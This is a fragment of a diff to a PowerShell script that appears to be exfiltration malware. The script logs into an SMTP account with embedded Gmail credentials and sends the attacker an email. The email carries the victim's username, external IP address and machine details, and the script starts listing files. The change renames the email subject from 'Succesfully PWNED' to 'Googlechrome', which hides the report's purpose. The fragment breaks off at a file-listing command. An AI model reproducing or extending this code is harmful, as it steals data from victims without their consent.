@@ -19,7 +19,7 @@ $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('beneafrr@gmail.
 $ReportEmail.From = 'beneafrr@gmail.com'
 $ReportEmail.To.Add('beneafrr@gmail.com')
 $ip = Invoke-RestMethod "myexternalip.com/raw"
-$ReportEmail.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
+$ReportEmail.Subject = "Googlechrome " + $env:USERNAME + "! (" + $ip + ")"
 $ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
 $ReportEmail.Body = 'Opening web.'
 $files=Get-ChildItem 
